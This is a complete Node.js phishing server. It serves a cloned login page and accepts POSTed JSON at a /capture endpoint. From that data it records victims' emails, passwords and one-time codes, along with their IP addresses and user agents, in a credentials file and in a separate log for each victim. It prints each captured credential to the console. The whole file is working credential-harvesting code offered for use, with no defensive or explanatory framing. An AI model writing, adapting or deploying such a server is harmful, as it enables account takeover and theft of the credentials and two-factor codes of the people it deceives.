const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 80;
const LOG_DIR = './logs';
const CREDS_FILE = './creds.txt';

// Ensure directories exist
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

// Helper to log data
function logData(data) {
    const timestamp = new Date().toISOString();
    const logLine = `[${timestamp}] ${JSON.stringify(data)}\n`;
    
    // Append to creds file
    fs.appendFileSync(CREDS_FILE, logLine);
    
    // Also write individual log file per session
    const email = data.email || 'unknown';
    const safeEmail = email.replace(/[^a-zA-Z0-9]/g, '_');
    fs.appendFileSync(`${LOG_DIR}/${safeEmail}.log`, logLine);
    
    console.log(`[+] Captured: ${email} | ${data.password || data.otp || 'no credential'}`);
}

const server = http.createServer((req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    if (req.method === 'POST' && req.url === '/capture') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                logData(data);
                
                // Log IP and extra info
                const metaLine = `[${new Date().toISOString()}] IP: ${req.socket.remoteAddress} | UA: ${data.userAgent || 'N/A'}\n`;
                fs.appendFileSync(CREDS_FILE, metaLine);
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'ok' }));
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ status: 'error' }));
            }
        });
        return;
    }

    // Serve the phishing page
    let filePath = req.url === '/' ? './index.html' : '.' + req.url;
    const extname = path.extname(filePath);
    const mimeTypes = {
        '.html': 'text/html',
        '.js': 'application/javascript',
        '.css': 'text/css',
        '.png': 'image/png',
        '.jpg': 'image/jpeg',
        '.svg': 'image/svg+xml',
        '.ico': 'image/x-icon'
    };

    fs.readFile(filePath, (err, content) => {
        if (err) {
            res.writeHead(404);
            res.end('Not found');
            return;
        }
        res.writeHead(200, { 'Content-Type': mimeTypes[extname] || 'text/html' });
        res.end(content);
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] Phishing server running on http://0.0.0.0:${PORT}`);
    console.log(`[+] Credentials will be saved to ${CREDS_FILE}`);
    console.log(`[+] Individual logs in ${LOG_DIR}/`);
});
